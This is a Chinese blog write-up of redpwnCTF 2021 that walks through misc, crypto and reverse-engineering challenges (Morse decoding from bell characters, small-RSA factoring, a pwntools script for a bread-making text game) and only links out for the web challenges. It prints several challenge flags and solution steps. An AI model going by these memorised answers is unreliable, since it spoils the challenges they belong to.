<p>wp参见<a href="https://docs.google.com/spreadsheets/d/1JGIqgt7aSLYM29ksMPIw2YmIRKEyIvZxXGQJfw7U9Fo/edit#gid=0">一张google sheet</a> <a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#wtjs>wp2</a></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200428355.png alt=image-20210716200428355></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200446450.png alt=image-20210716200446450></p>
<p>不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716203047760.png alt=image-20210716203047760></p>
<p>属实是蚌埠住了😅</p>
<h2 id=webmdbin>***web/MdBin</h2>
<blockquote>
<p>Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!</p>
<p><a href=https://mdbin.mc.ax/>mdbin.mc.ax</a></p>
<p>Submit to the admin at <a href=https://admin-bot.mc.ax/mdbin>admin-bot.mc.ax/mdbin</a>; the flag is in a cookie.</p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/35ee9be7cfa1b5fa6127e412b87ef3b8f6f1f99c676303db4cd18f13605281f5/mdbin.tar.gz>mdbin.tar.gz</a></p>
</blockquote>
<p>参考：<a href=https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/>wp1</a> <a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#mdbin>wp2</a></p>
<p>直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！</p>
<h2 id=weblazy-admin>***web/lazy-admin</h2>
<blockquote>
<p>Looks like another service with no functionality. I hope the admin is doing their job&mldr;</p>
<p><a href=https://lazy-admin.mc.ax/>lazy-admin.mc.ax</a></p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/5b2fc5a6d531a90e7f8f31975fcd4bdcd9863a5bb6bcb63df1d4cfd4ad7325b6/lazy-admin.tar.gz>lazy-admin.tar.gz</a></p>
</blockquote>
<p>参考：<a href=https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#lazy-admin>wp</a></p>
<p>难，我不懂</p>
<h2 id=miscsanity-check>misc/sanity-check</h2>
<blockquote>
<p>I get to write the sanity check challenge! Alright!</p>
<p><code>flag{1_l0v3_54n17y_ch3ck_ch4ll5}</code></p>
</blockquote>
<h2 id=miscdiscord>misc/discord</h2>
<blockquote>
<p>Join the <a href=https://pwn.red/discord>discord</a>! I hear <code>#rules</code> is an incredibly engaging read.</p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124614902.png alt=image-20210710124614902></p>
<h2 id=misccompliant-lattice-feline>misc/compliant-lattice-feline</h2>
<blockquote>
<p>get a flag! <code>nc mc.ax 31443</code></p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124835520.png alt=image-20210710124835520></p>
<h2 id=miscthe-substitution-game>*misc/the-substitution-game</h2>
<blockquote>
<p><code>nc mc.ax 31996</code></p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/e8ab069cf5ede93ff8f0aec7f441b7f5f69500ff049b7c3fc27a5949ecc12d90/chall.py>chall.py</a></p>
</blockquote>
<p>Markov Algorithm罢了</p>
<p>参见：<a href=https://mao.snuke.org/>Markov Algorithm Online</a></p>
<h2 id=miscannabel-lee>misc/annaBEL-lee</h2>
<blockquote>
<p>sounds from a kingdom by the sea</p>
<p>The server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.</p>
<p>What exactly <em>is</em> the server sending? Sometimes it makes a sound, sometimes it doesn&rsquo;t. Plotting it on a chart might help you see something.</p>
<p>It might be helpful to turn your sound on, but you&rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.</p>
<p>This is not audio steganography. Apologies if anyone went down that route.</p>
<p><code>nc mc.ax 31845</code></p>
</blockquote>
<p>nc连入后没有任何可视的回显，但是藏在了声音信息里</p>
<pre tabindex=0><code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
</code></pre><p>导出，有两种值：no bell(\x00) bell(\x07)，转化为0与1</p>
<pre tabindex=0><code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
</code></pre><p>改为莫斯电码的样子</p>
<pre tabindex=0><code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
</code></pre><p>解密</p>
<pre tabindex=0><code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
</code></pre><p><code>flag{d1ng-d0n9-g0es-th3-anna-b3l}</code></p>
<h2 id=cryptoscissor>crypto/scissor</h2>
<blockquote>
<p>I was given this string and told something about scissors. <code>egddagzp_ftue_rxms_iuft_rxms_radymf</code></p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/44dbfcfa8c7590e5afc686ce9d608ddf886c41ef1eee8b86a860af011dc26d73/encrypt.py>encrypt.py</a></p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710135412576.png alt=image-20210710135412576></p>
<h2 id=cryptobaby>crypto/baby</h2>
<blockquote>
<p>I want to do an RSA!</p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt>output.txt</a></p>
</blockquote>
<pre tabindex=0><code>n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
</code></pre><p><del>一点都不会crypto……</del> 其实查一下<code>RSA n e c</code>其实就能做出来后面的东西了</p>
<p><a href=https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c>RSA decryption using only n e and c</a> 然后就会知道这个东西 <a href=https://github.com/Ganapati>Ganapati</a>/<a href=https://github.com/Ganapati/RsaCtfTool>RsaCtfTool</a>，或者这个在线网站 <a href=https://www.dcode.fr/rsa-cipher>RSA Cipher</a></p>
<p>为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 <a href=https://zh.numberempire.com/numberfactorizer.php>整数分解工具</a></p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172732092.png alt=image-20210716172732092></p>
<p>之后就可以愉快的解密了！</p>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172627393.png alt=image-20210716172627393></p>
<h2 id=revwstrings>rev/wstrings</h2>
<blockquote>
<p>Some strings are wider than normal&mldr;</p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/c3c2ce7829ac7fb904ab02de13b4fbdda69232159c7a5dfa6d7d0fa37606a45d/wstrings>wstrings</a></p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808184746679.png alt=image-20210808184746679></p>
<p><code>flag{n0t_al1_str1ngs_ar3_sk1nny}</code></p>
<h2 id=revbread-making>rev/bread-making</h2>
<blockquote>
<p>My parents aren&rsquo;t home! Quick, help me make some bread please&mldr; <code>nc mc.ax 31796</code></p>
<p>Downloads: <a href=https://static.redpwn.net/uploads/9eee9f077b941e88e1fe75d404582d4f286d9c74729f3ad0d1bb44a527579af8/bread>bread</a></p>
</blockquote>
<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png alt=image-20210710154321719></p>
<p>参考：<a href=https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md>wp2</a> <a href=https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making>wp3</a> <a href=https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713>wp4</a></p>
<p>我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的</p>
<pre tabindex=0><code>add ingredients to the bowl
add flour
add yeast
add salt
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
unplug the fire alarm
open the window
unplug the oven
clean the counters
flush the bread down the toilet
wash the sink
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
</code></pre><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png alt=image-20210716181440958></p>
<p>The flag is: <code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}</code></p>
<p>调试的过程是linux下的py脚本</p>
<pre tabindex=0><code>from pwn import *

p = remote(&quot;mc.ax&quot;, 31796)

p.sendlineafter(&quot;bowl&quot;, &quot;add flour&quot;)
p.sendlineafter(&quot;flour has been added&quot;, &quot;add yeast&quot;)
p.sendlineafter(&quot;yeast has been added&quot;, &quot;add salt&quot;)
p.sendlineafter(&quot;salt has been added&quot;, &quot;add water&quot;)
p.sendlineafter(&quot;lumpy dough&quot;, &quot;hide the bowl inside a box&quot;)
p.sendlineafter(&quot;to rise&quot;, &quot;wait 3 hours&quot;)
p.sendlineafter(&quot;finish the dough&quot;, &quot;work in the basement&quot;)
p.sendlineafter(&quot;needs to be baked&quot;, &quot;preheat the toaster oven&quot;)
p.sendlineafter(&quot;for 45 minutes&quot;, &quot;set a timer on your phone&quot;)
p.sendlineafter(&quot;awfully long time&quot;, &quot;watch the bread bake&quot;)
p.sendlineafter(&quot;no time to waste&quot;, &quot;pull the tray out with a towel&quot;)
p.sendlineafter(&quot;smoke in the air&quot;, &quot;unplug the fire alarm&quot;)
p.sendlineafter(&quot;in another room&quot;, &quot;open the window&quot;)
p.sendlineafter(&quot;air rushes in&quot;, &quot;unplug the oven&quot;)
p.sendlineafter(&quot;kitchen is a mess&quot;, &quot;wash the sink&quot;)
p.sendlineafter(&quot;sink is cleaned&quot;, &quot;clean the counters&quot;)
p.sendlineafter(&quot;counters are cleaned&quot;, &quot;flush the bread down the toilet&quot;)
p.sendlineafter(&quot;is disposed of&quot;, &quot;get ready to sleep&quot;)
p.sendlineafter(&quot;go to sleep&quot;, &quot;close the window&quot;)
p.sendlineafter(&quot;window is closed&quot;, &quot;replace the fire alarm&quot;)
p.sendlineafter(&quot;alarm is replaced&quot;, &quot;brush teeth and go to bed&quot;)
p.interactive()
p.close()
</code></pre><p>这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间</p>
<h2 id=后记>后记</h2>
<p>这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~</p>
<p>就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼</p>
</div>
</section>
</article>
</main>
<div class="w-full h-0 flex-none order-3"></div>
<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
<div class="md:max-w-xs flex flex-col md:items-end">
<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
<li class="px-1 md:px-0">
<a href=/posts/ title="Posts page">
Posts
</a>
</li>
<li class="px-1 md:px-0">
<a href=/relax/ title="Relaxxx page">
Relaxxx
</a>
</li>
<li class="px-1 md:px-0">
<a href=/categories/ title="Categories page">
Categories
</a>
</li>
<li class="px-1 md:px-0">
<a href=/tags/ title="Tags page">
Tags
</a>
</li>
<li class="px-1 md:px-0">
<a href=/series/ title="Series page">
Series
</a>
</li>
<li class="px-1 md:px-0">
<a href=/about/ title="About page">
About
</a>
</li>
<li class="px-1 md:px-0">
<a href=/friends/ title="Friends page">
Friends
</a>
</li>
<div id=fastSearch class=m-0>
<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
</ul>
</div>
</ul>
<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
</div>
</a>
<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
</div>
</a>
<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
</div>
</a>
<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
</div>
</a>
<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
</div>
</a>
<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
</div>
</a>
<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
</div>
</a>
<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
